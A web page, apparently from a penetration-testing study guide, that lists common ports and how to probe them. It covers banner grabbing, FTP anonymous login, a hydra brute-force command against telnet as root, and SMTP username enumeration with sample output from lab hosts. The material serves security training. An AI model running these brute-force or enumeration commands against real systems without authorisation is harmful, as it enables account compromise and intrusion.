@@ -1,0 +1,2090 @@
+
+<!DOCTYPE HTML>
+<html lang="en" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Common ports\/services and how to use them · Total OSCP Guide</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.2">
+        <meta name="author" content="sushant747">
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-comment/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+        <link rel="stylesheet" href="styles/website.css">
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="port_knocking.html" />
+    
+    
+    <link rel="prev" href="server-side-vulnerabilities.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="https://www.gitbook.com/book/sushant747/total-oscp-guide" target="_blank" class="custom-link">Total OSCP Guide</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="the_basics.html">
+            
+                <a href="the_basics.html">
+            
+                    
+                    The Basics
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="linux.html">
+            
+                <a href="linux.html">
+            
+                    
+                    Linux
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="basics_of_linux.html">
+            
+                <a href="basics_of_linux.html">
+            
+                    
+                    Basics of Linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="bash-scripting.html">
+            
+                <a href="bash-scripting.html">
+            
+                    
+                    Bash-scripting
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="vim.html">
+            
+                <a href="vim.html">
+            
+                    
+                    Vim
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="windows.html">
+            
+                <a href="windows.html">
+            
+                    
+                    Windows
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" data-path="basics_of_windows.html">
+            
+                <a href="basics_of_windows.html">
+            
+                    
+                    Basics of Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2" data-path="powershell.html">
+            
+                <a href="powershell.html">
+            
+                    
+                    PowerShell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3" data-path="powershell_scripting2.html">
+            
+                <a href="powershell_scripting2.html">
+            
+                    
+                    PowerShell Scripting
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.4" data-path="cmd.html">
+            
+                <a href="cmd.html">
+            
+                    
+                    CMD
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="scripting_with_python.html">
+            
+                <a href="scripting_with_python.html">
+            
+                    
+                    Scripting With Python
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="python_fundamentals.html">
+            
+                <a href="python_fundamentals.html">
+            
+                    
+                    Python Fundamentals
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.2" data-path="connections.html">
+            
+                <a href="connections.html">
+            
+                    
+                    Useful Scripts
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="transfering_files2.html">
+            
+                <a href="transfering_files2.html">
+            
+                    
+                    Transferring Files
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="transfering_files.html">
+            
+                <a href="transfering_files.html">
+            
+                    
+                    Transfering Files on Linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="transfering_files_to_windows.html">
+            
+                <a href="transfering_files_to_windows.html">
+            
+                    
+                    Transfering files on Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="firewalls.html">
+            
+                <a href="firewalls.html">
+            
+                    
+                    Firewalls
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="general_tips.html">
+            
+                <a href="general_tips.html">
+            
+                    
+                    General tips and tricks
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="scanning.html">
+            
+                <a href="scanning.html">
+            
+                    
+                    Recon and Information Gathering Phase
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="passive_information_gatherig.html">
+            
+                <a href="passive_information_gatherig.html">
+            
+                    
+                    Passive Information Gatherig
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1" >
+            
+                <span>
+            
+                    
+                    Identify IP-addresses and Subdomains
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1.1" >
+            
+                <span>
+            
+                    
+                    Identify IP-addresses
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.1.2" data-path="find_subdomains.html">
+            
+                <a href="find_subdomains.html">
+            
+                    
+                    Find Subdomains
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1.2.1" data-path="dns_basics.html">
+            
+                <a href="dns_basics.html">
+            
+                    
+                    DNS Basics
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.1.2.2" data-path="finding_subdomains.html">
+            
+                <a href="finding_subdomains.html">
+            
+                    
+                    Finding subdomains
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.1.2.3" data-path="dns_zone_transfer_attack.html">
+            
+                <a href="dns_zone_transfer_attack.html">
+            
+                    
+                    DNS Zone Transfer Attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.2" data-path="email_harvesting.html">
+            
+                <a href="email_harvesting.html">
+            
+                    
+                    Identifying People
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.3" data-path="google_hacking.html">
+            
+                <a href="google_hacking.html">
+            
+                    
+                    Search Engine Discovery
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.4" data-path="identifying-technology-stack.html">
+            
+                <a href="identifying-technology-stack.html">
+            
+                    
+                    Identifying Technology Stack
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="active_information_gathering.html">
+            
+                <a href="active_information_gathering.html">
+            
+                    
+                    Active Information Gathering
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.1" data-path="port_scanning.html">
+            
+                <a href="port_scanning.html">
+            
+                    
+                    Port Scanning
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="vulnerability_analysi1s.html">
+            
+                <a href="vulnerability_analysi1s.html">
+            
+                    
+                    Vulnerability analysis
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="server-side-vulnerabilities.html">
+            
+                <a href="server-side-vulnerabilities.html">
+            
+                    
+                    Server-side Vulnerabilities
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.4.1.1" data-path="list_of_common_ports.html">
+            
+                <a href="list_of_common_ports.html">
+            
+                    
+                    Common ports\/services and how to use them
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.2" data-path="port_knocking.html">
+            
+                <a href="port_knocking.html">
+            
+                    
+                    Port Knocking
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="web-services.html">
+            
+                <a href="web-services.html">
+            
+                    
+                    HTTP - Web Vulnerabilities
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1" data-path="common_web-services.html">
+            
+                <a href="common_web-services.html">
+            
+                    
+                    Common Web-services
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2" data-path="waf_-_web_application_firewall.html">
+            
+                <a href="waf_-_web_application_firewall.html">
+            
+                    
+                    WAF - Web Application Firewall
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3" data-path="lead_to_compromise.html">
+            
+                <a href="lead_to_compromise.html">
+            
+                    
+                    Attacking the System
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.3.1" data-path="local_file_inclusion.html">
+            
+                <a href="local_file_inclusion.html">
+            
+                    
+                    Local File Inclusion
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3.2" data-path="remote_file_inclusion.html">
+            
+                <a href="remote_file_inclusion.html">
+            
+                    
+                    Remote File Inclusion
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3.3" data-path="web-scanning.html">
+            
+                <a href="web-scanning.html">
+            
+                    
+                    Hidden Files and Directories
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3.4" data-path="sql-injections.html">
+            
+                <a href="sql-injections.html">
+            
+                    
+                    SQL-Injections
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3.5" data-path="nosql-injections.html">
+            
+                <a href="nosql-injections.html">
+            
+                    
+                    Nosql-Injections
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3.6" data-path="xml_external_entity_attack.html">
+            
+                <a href="xml_external_entity_attack.html">
+            
+                    
+                    XML External Entity Attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3.7" data-path="bypass_image_upload.html">
+            
+                <a href="bypass_image_upload.html">
+            
+                    
+                    Bypass File Upload Filtering
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3.8" data-path="exposed_version_control.html">
+            
+                <a href="exposed_version_control.html">
+            
+                    
+                    Exposed Version Control
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3.9" data-path="failure-to-restrict-url-access.html">
+            
+                <a href="failure-to-restrict-url-access.html">
+            
+                    
+                    Failure to Restrict URL Access
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4" data-path="attacking_the_user.html">
+            
+                <a href="attacking_the_user.html">
+            
+                    
+                    Attacking the User
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.4.1" data-path="clickjacking.html">
+            
+                <a href="clickjacking.html">
+            
+                    
+                    Clickjacking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.2" data-path="broken_authentication_or_session_management.html">
+            
+                <a href="broken_authentication_or_session_management.html">
+            
+                    
+                    Broken Authentication or Session Management
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.3" data-path="text-injection.html">
+            
+                <a href="text-injection.html">
+            
+                    
+                    Text\/content-injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.4" data-path="subdomain_takeover.html">
+            
+                <a href="subdomain_takeover.html">
+            
+                    
+                    Subdomain Takeover
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.5" data-path="cross_site_request_forgery.html">
+            
+                <a href="cross_site_request_forgery.html">
+            
+                    
+                    Cross Site Request Forgery
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.6" data-path="cross-site-scripting.html">
+            
+                <a href="cross-site-scripting.html">
+            
+                    
+                    Cross-site-scripting
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.4.6.1" data-path="examplesXSS.html">
+            
+                <a href="examplesXSS.html">
+            
+                    
+                    Examples
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.7" data-path="browser_vulnerabilities.html">
+            
+                <a href="browser_vulnerabilities.html">
+            
+                    
+                    Browser Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.8" data-path="java_applet.html">
+            
+                <a href="java_applet.html">
+            
+                    
+                    Java Applet
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="automated_vulnerability_scanners.html">
+            
+                <a href="automated_vulnerability_scanners.html">
+            
+                    
+                    Automated Vulnerability Scanners
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="exploiting.html">
+            
+                <a href="exploiting.html">
+            
+                    
+                    Exploiting
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="social_engineering_-_phishing.html">
+            
+                <a href="social_engineering_-_phishing.html">
+            
+                    
+                    Social Engineering - Phishing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="default_layout_apache_on_different_versiont.html">
+            
+                <a href="default_layout_apache_on_different_versiont.html">
+            
+                    
+                    Default Layout of Apache on Different Versions
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="reverse-shell.html">
+            
+                <a href="reverse-shell.html">
+            
+                    
+                    Shells
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="webshell.html">
+            
+                <a href="webshell.html">
+            
+                    
+                    Webshell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="create_shellcode.html">
+            
+                <a href="create_shellcode.html">
+            
+                    
+                    Generate Shellcode
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="editing-exploits.html">
+            
+                <a href="editing-exploits.html">
+            
+                    
+                    Editing Exploits
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.7" data-path="compiling-windows-exploits.html">
+            
+                <a href="compiling-windows-exploits.html">
+            
+                    
+                    Compiling windows exploits
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="post_exploitation.html">
+            
+                <a href="post_exploitation.html">
+            
+                    
+                    Post Exploitation
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="spawning_shells.html">
+            
+                <a href="spawning_shells.html">
+            
+                    
+                    Spawning Shells
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" data-path="getting_meterpreter_shell.html">
+            
+                <a href="getting_meterpreter_shell.html">
+            
+                    
+                    Meterpreter for Post-Exploitation
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="privilege_escalation_-_linux.html">
+            
+                <a href="privilege_escalation_-_linux.html">
+            
+                    
+                    Privilege Escalation - Linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.4" data-path="privilege_escalation_windows.html">
+            
+                <a href="privilege_escalation_windows.html">
+            
+                    
+                    Privilege Escalation - Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.5" data-path="escaping_restricted_shell.html">
+            
+                <a href="escaping_restricted_shell.html">
+            
+                    
+                    Escaping Restricted Shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.6" data-path="bypassing_antivirus.html">
+            
+                <a href="bypassing_antivirus.html">
+            
+                    
+                    Bypassing antivirus
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.7" data-path="loot.html">
+            
+                <a href="loot.html">
+            
+                    
+                    Loot and Enumerate
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.7.1" data-path="loot_windows_-_for_credentials_and_other_stuff.html">
+            
+                <a href="loot_windows_-_for_credentials_and_other_stuff.html">
+            
+                    
+                    Loot Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.7.2" data-path="tcp-dumps_on_pwnd_machines.html">
+            
+                <a href="tcp-dumps_on_pwnd_machines.html">
+            
+                    
+                    Loot Linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.8" data-path="persistence.html">
+            
+                <a href="persistence.html">
+            
+                    
+                    Persistence
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.9" data-path="clean_up.html">
+            
+                <a href="clean_up.html">
+            
+                    
+                    Cover your tracks
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="password-cracking.html">
+            
+                <a href="password-cracking.html">
+            
+                    
+                    Password Cracking
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="generate_custom_wordlist.html">
+            
+                <a href="generate_custom_wordlist.html">
+            
+                    
+                    Generate Custom Wordlist
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="identify_hash_and_crack_it.html">
+            
+                <a href="identify_hash_and_crack_it.html">
+            
+                    
+                    Offline Password Cracking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.3" data-path="online_password_cracking.html">
+            
+                <a href="online_password_cracking.html">
+            
+                    
+                    Online Password Cracking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.4" data-path="pass_the_hash_-_reusing_hashes.html">
+            
+                <a href="pass_the_hash_-_reusing_hashes.html">
+            
+                    
+                    Pass the Hash - Reusing Hashes
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="port_forwarding_and_tunneling.html">
+            
+                <a href="port_forwarding_and_tunneling.html">
+            
+                    
+                    Pivoting - Port forwarding - Tunneling
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" data-path="network_traffic.html">
+            
+                <a href="network_traffic.html">
+            
+                    
+                    Network traffic analysis
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1" data-path="arp-spoofing.html">
+            
+                <a href="arp-spoofing.html">
+            
+                    
+                    Arp-spoofing
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1.1" data-path="ssl-strip.html">
+            
+                <a href="ssl-strip.html">
+            
+                    
+                    SSL-strip
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.2" data-path="dns-spoofing.html">
+            
+                <a href="dns-spoofing.html">
+            
+                    
+                    DNS-spoofing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.3" data-path="wireshark.html">
+            
+                <a href="wireshark.html">
+            
+                    
+                    Wireshark
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" data-path="wifi.html">
+            
+                <a href="wifi.html">
+            
+                    
+                    Wifi
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.10.1" data-path="wep.html">
+            
+                <a href="wep.html">
+            
+                    
+                    WEP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10.2" data-path="wps.html">
+            
+                <a href="wps.html">
+            
+                    
+                    WPS
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.11" data-path="physical_access_to_machine.html">
+            
+                <a href="physical_access_to_machine.html">
+            
+                    
+                    Physical access to machine
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12" data-path="littearature.html">
+            
+                <a href="littearature.html">
+            
+                    
+                    Literature
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="." >Common ports\/services and how to use them</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="common-portsservices-and-how-to-use-them">Common ports/services and how to use them</h1>
+<p>I will try to make this chapter into a reference library. So that you can just check in this chapter to see common ways to exploit certain common services. I will only discuss the most common, since there are quite a few.</p>
+<p>This is fucking awesome. if there is any ports here you dont find check out this guide.
+<a href="http://www.0daysecurity.com/penetration-testing/enumeration.html" target="_blank">http://www.0daysecurity.com/penetration-testing/enumeration.html</a></p>
+<h2 id="port-xxx---service-unknown">Port XXX - Service unknown</h2>
+<p>If you have a port open with unkown service you can do this to find out which service it might be.</p>
+<pre><code>amap -d 192.168.19.244 8000
+</code></pre><h2 id="port-21---ftp">Port 21 - FTP</h2>
+<p>Connect to the ftp-server to enumerate software and version</p>
+<pre><code>ftp 192.168.1.101
+nc 192.168.1.101 21
+</code></pre><p>Many ftp-servers allow anonymous users. These might be misconfigured and give too much access, and it might also be necessary for certain exploits to work. So always try to log in with <code>anonymous:anonymous</code>.</p>
+<p><strong>Remember the binary and ascii mode!</strong></p>
+<p>If you upload a binary file you have to put the ftp-server in binary mode, otherwise the file will become corrupted and you will not be able to use it! The same for text-files. Use ascii mode for them!
+You just write <strong>binary</strong> and <strong>ascii</strong> to switch mode.</p>
+<h2 id="port-22---ssh">Port 22 - SSH</h2>
+<p>SSH is such an old and fundamental technology so most modern version are quite hardened.
+You can find out the version of the SSH either but scanning it with nmap or by connecting with it using <code>nc</code>.</p>
+<pre><code>nc 192.168.1.10 22
+</code></pre><p>It returnes something like this:
+SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu1</p>
+<p>This banner is defined in RFC4253, in chapter 4.2 Protocol Version Exchange. <a href="http://www.openssh.com/txt/rfc4253.txt" target="_blank">http://www.openssh.com/txt/rfc4253.txt</a>
+The protocol-version string should be defined like this: <code>SSH-protoversion-softwareversion SP comments CR LF</code>
+Where comments is optional. And SP means space, and CR (carriege return) and LF (Line feed)
+So basically the comments should be separated by a space. </p>
+<h2 id="port-23---telnet">Port 23 - Telnet</h2>
+<p>Telnet is considered insecure mainly because it does not encrypt its traffic. Also a quick search in exploit-db will show that there are various RCE-vulnerabilities on different versions. Might be worth checking out. </p>
+<p><strong>Brute force it</strong></p>
+<p>You can also brute force it like this:</p>
+<pre><code>hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt 192.168.1.101 telnet
+</code></pre><h2 id="port-25---smtp">Port 25 - SMTP</h2>
+<p>SMTP is a server to server service. The user receives or sends emails using IMAP or POP3. Those messages are then routed to the SMTP-server which communicates the email to another server.
+The SMTP-server has a database with all emails that can receive or send emails. We can use SMTP to query that database for possible email-addresses. Notice that we cannot retrieve any emails from SMTP. We can only send emails.</p>
+<p>Here are the possible commands</p>
+<pre><code>HELO - 
+EHLO - Extended SMTP.
+STARTTLS - SMTP communicted over unencrypted protocol. By starting TLS-session we encrypt the traffic.
+RCPT - Address of the recipient.
+DATA - Starts the transfer of the message contents.
+RSET - Used to abort the current email transaction.
+MAIL - Specifies the email address of the sender.
+QUIT - Closes the connection.
+HELP - Asks for the help screen.
+AUTH - Used to authenticate the client to the server.
+VRFY - Asks the server to verify is the email user&apos;s mailbox exists.
+</code></pre><h3 id="manually">Manually</h3>
+<p>We can use this service to find out which usernames are in the database. This can be done in the following way.</p>
+<pre><code>nc 192.168.1.103 25                                                                               
+
+220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
+VRFY root
+252 2.0.0 root
+VRFY roooooot
+550 5.1.1 &lt;roooooot&gt;: Recipient address rejected: User unknown in local recipient table
+</code></pre><p>Here we have managed to identify the user <code>root</code>. But <code>roooooot</code> was rejected.</p>
+<p><code>VRFY</code>, <code>EXPN</code> and <code>RCPT</code> can be used to identify users.</p>
+<p>Telnet is a bit more friendly some times. So always use that too</p>
+<pre><code>telnet 10.11.1.229 25
+</code></pre><h3 id="automatized">Automatized</h3>
+<p>This process can of course be automatized</p>
+<p><strong>Check for commands</strong></p>
+<pre><code>nmap -script smtp-commands.nse 192.168.1.101
+</code></pre><h4 id="smtp-user-enum">smtp-user-enum</h4>
+<p>The command will look like this. <code>-M</code> for mode. <code>-U</code> for userlist. <code>-t</code> for target</p>
+<pre><code>smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 192.168.1.103
+</code></pre><pre><code>Mode ..................... VRFY
+Worker Processes ......... 5
+Usernames file ........... /root/sectools/SecLists/Usernames/Names/names.txt
+Target count ............. 1
+Username count ........... 8607
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ 
+
+######## Scan started at Sun Jun 19 11:04:59 2016 #########
+192.168.1.103: Bin exists
+192.168.1.103: Irc exists
+192.168.1.103: Mail exists
+192.168.1.103: Man exists
+192.168.1.103: Sys exists
+######## Scan completed at Sun Jun 19 11:06:51 2016 #########
+5 results.
+
+8607 queries in 112 seconds (76.8 queries / sec)
+</code></pre><h4 id="metasploit">Metasploit</h4>
+<p>I can also be done using metasploit</p>
+<pre><code>msf &gt; use auxiliary/scanner/smtp/smtp_enum 
+msf auxiliary(smtp_enum) &gt; show options
+
+Module options (auxiliary/scanner/smtp/smtp_enum):
+
+   Name       Current Setting                                                Required  Description
+   ----       ---------------                                                --------  -----------
+   RHOSTS                                                                    yes       The target address range or CIDR identifier
+   RPORT      25                                                             yes       The target port
+   THREADS    1                                                              yes       The number of concurrent threads
+   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
+   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.
+</code></pre><p>Here are the documentations for SMTP
+<a href="https://cr.yp.to/smtp/vrfy.html" target="_blank">https://cr.yp.to/smtp/vrfy.html</a></p>
+<p><a href="http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/" target="_blank">http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/</a></p>
+<p><a href="http://www.dummies.com/how-to/content/smtp-hacks-and-how-to-guard-against-them.html" target="_blank">http://www.dummies.com/how-to/content/smtp-hacks-and-how-to-guard-against-them.html</a></p>
+<p><a href="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum" target="_blank">http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum</a></p>
